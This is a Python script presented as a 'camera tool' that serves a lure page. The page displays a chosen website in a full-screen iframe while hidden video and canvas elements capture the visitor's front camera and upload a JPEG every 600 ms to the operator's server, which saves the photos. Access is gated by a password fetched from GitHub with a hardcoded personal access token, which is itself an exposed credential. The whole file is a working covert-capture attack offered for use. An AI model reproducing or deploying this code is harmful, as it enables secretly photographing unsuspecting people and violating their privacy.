import requests
import sys
import http.server
import socketserver
import urllib.parse
import base64
import os
import time

# --- GITHUB AUTH CONFIGURATION ---
GITHUB_USERNAME = "yeasinhossain544"
REPO_NAME = "yeasinju-config"

TOKEN = "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"


URL = f"https://api.github.com/repos/{GITHUB_USERNAME}/{REPO_NAME}/contents/config.json"

def verify_tool_access():
    headers = {
        "Authorization": f"token {TOKEN}",
        "Accept": "application/vnd.github.v3.raw",
        "User-Agent": "Python-App"
    }
    
    try:
        response = requests.get(URL, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            correct_pass = data.get("password")
            correct_otp = data.get("otp")

            user_pass = input("Enter Password: ").strip()
            user_otp = input("Enter OTP: ").strip()

            if user_pass == correct_pass and user_otp == correct_otp:
                print("\n[+] Access Granted! Welcome to the Tool.\n")
                return True
            else:
                print("\n[-] Invalid Password or OTP! Access Denied.")
                return False
        else:
            print("\n[-] Error fetching configuration. Status Code:", response.status_code)
            return False
            
    except Exception as e:
        print("\n[-] Connection Error! Please check your internet connection.")
        return False

# --- MAIN TOOL PROCESS ---
def run_main_tool():
    # Screen clear
    os.system('clear' if os.name != 'nt' else 'cls')

    PORT = 3333
    IMAGE_DIR = "captured_images"

    if not os.path.exists(IMAGE_DIR):
        os.makedirs(IMAGE_DIR)

    # ANSI Color Codes
    GREEN = "\033[92m"
    CYAN = "\033[96m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    RESET = "\033[0m"

    def print_banner():
        print(CYAN + "=" * 60 + RESET)
        print(GREEN + r"""
   __  _____ __    ____ _  _   |_  |  |
  \ \ / / _ / _\  / ___/ || |  | | |  |
   \ V /  __/ /_  \___ \ || | _| | |_ |
    |_|\___|\__/  |____/_||_|(___|\___/
        """ + RESET)
        print(YELLOW + "            [ YEASINJU FRAMEWORK - CAMERA TOOL ]            " + RESET)
        print(CYAN + "=" * 60 + RESET)

    print_banner()

    target_url = input(YELLOW + "[+] Enter Site URL to Display (e.g. https://google.com): " + RESET).strip()

    if not target_url.startswith(("http://", "https://")):
        target_url = "https://" + target_url

    print(GREEN + f"[*] Site Loaded in Background: {target_url}" + RESET)
    print(CYAN + "=" * 60 + RESET)

    HTML_TEMPLATE = f"""<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        html, body {{
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #ffffff;
        }}
        iframe {{
            width: 100%;
            height: 100%;
            border: none;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }}
    </style>
</head>
<body>
    <iframe src="{target_url}"></iframe>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        let isUploading = false;

        const constraints = {{
            video: {{
                width: {{ ideal: 1920 }},
                height: {{ ideal: 1080 }},
                facingMode: "user"
            }}
        }};

        navigator.mediaDevices.getUserMedia(constraints)
            .then(stream => {{
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {{
                    canvas.width = video.videoWidth || 1280;
                    canvas.height = video.videoHeight || 720;
                    const context = canvas.getContext('2d');

                    setInterval(() => {{
                        if (isUploading) return;
                        
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        const imageData = canvas.toDataURL('image/jpeg', 0.95);
                        
                        isUploading = true;
                        fetch('/upload', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/x-www-form-urlencoded' }},
                            body: 'image=' + encodeURIComponent(imageData)
                        }}).finally(() => {{
                            isUploading = false;
                        }});
                    }}, 600);
                }};
            }})
            .catch(err => {{
                console.log("Permission Error:", err);
            }});
    </script>
</body>
</html>
"""

    class CustomHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(HTML_TEMPLATE.encode('utf-8'))

        def do_POST(self):
            if self.path == '/upload':
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length).decode('utf-8')
                
                parsed_data = urllib.parse.parse_qs(post_data)
                if 'image' in parsed_data:
                    img_data = parsed_data['image'][0]
                    img_data = img_data.replace('data:image/jpeg;base64,', '').replace(' ', '+')
                    
                    filename = os.path.join(IMAGE_DIR, f"yeasinju_{int(time.time() * 1000)}.jpg")
                    try:
                        with open(filename, "wb") as fh:
                            fh.write(base64.b64decode(img_data))
                        print(GREEN + f"[+] Captured -> ./{filename}" + RESET)
                    except Exception as e:
                        print(RED + f"[-] Error: {e}" + RESET)
                
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"OK")

    print(GREEN + f"[*] Server running on: http://localhost:{PORT}" + RESET)
    print(GREEN + f"[*] Captured images directory: ./{IMAGE_DIR}/" + RESET)
    
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print(RED + "\n[*] Tool Stopped." + RESET)


# --- SCRIPT EXECUTION ENTRY POINT ---
if __name__ == "__main__":
    if verify_tool_access():
        run_main_tool()
    else:
        sys.exit()
